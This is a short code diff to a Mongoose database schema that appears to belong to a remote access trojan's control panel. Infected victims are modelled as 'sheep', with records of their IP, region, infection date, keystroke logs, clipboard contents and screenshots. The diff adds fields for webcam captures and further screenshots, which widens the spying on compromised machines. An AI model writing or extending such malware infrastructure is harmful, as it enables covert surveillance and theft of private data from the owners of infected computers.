@@ -8,6 +8,8 @@ interface ISheep extends Document {
     active: boolean;
     lastActivity: Date;
     infectionDate: Date;
+    webcams: string[];
+    screenshots: string[];
     keylog: { keylogDate: Date; data: string }[];
     clipboard: { clipboardDate: Date; data: string }[];
     screenshot: { screenshotDate: Date; file: Buffer }[];
@@ -35,8 +37,10 @@ const sheepSchema: Schema = new Schema({
     ip: { type: String, required: true },
     region: { type: String, required: true },
     active: { type: Boolean, required: true, default: true },
-    lastActivity: { type: Date, required: true },
+    lastActivity: { type: Date, required: false },
     infectionDate: { type: Date, required: true },
+    webcams: { type: [String], required: false, default: [] },
+    screenshots: { type: [String], required: false, default: [] },
     keylog: { type: [keylogSchema], required: false, default: [] },
     clipboard: { type: [clipboardSchema], required: false, default: [] },
     screenshot: { type: [screenshotSchema], required: false, default: [] },
